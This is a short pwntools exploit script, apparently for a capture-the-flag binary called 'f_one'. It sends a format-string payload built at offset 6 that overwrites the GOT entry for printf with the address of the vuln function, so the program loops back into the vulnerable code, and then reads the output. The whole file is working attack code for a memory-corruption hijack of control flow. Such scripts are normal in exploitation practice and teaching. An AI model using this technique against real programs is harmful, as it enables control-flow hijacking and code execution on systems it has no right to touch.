from pwn import *

exe = './f_one'

elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

context.log_level = 'debug'

p = process(exe)

offset = 6
vuln = elf.functions['vuln']

payload = fmtstr_payload(offset, {elf.got.printf : elf.sym.vuln})

p.sendafter('give me something:', payload)

print(p.recvline())

p.send('test')

print(p.recvall())
